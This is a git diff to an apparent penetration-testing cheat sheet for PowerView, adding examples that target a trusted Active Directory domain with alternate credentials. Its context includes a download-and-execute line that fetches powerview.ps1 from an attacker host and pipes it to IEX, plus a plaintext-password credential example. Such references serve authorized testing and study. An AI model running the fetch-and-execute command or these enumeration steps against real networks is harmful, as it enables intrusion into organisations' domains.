@@ -18,11 +18,16 @@ ConvertTo-SID -Name <name>
 (new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
 ```
 
+## Target a different domain (Trust)
+```powershell
+<command> -Domain <dst_domain_fqdn>
+```
+
 ## Use different credentials (-Credential)
 ```powershell
 $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
-<command> -Credential $Cred
+<command> -Credential $Cred -Domain <dst_domain_fqdn>
 ```
 
 ## Impersonate a user
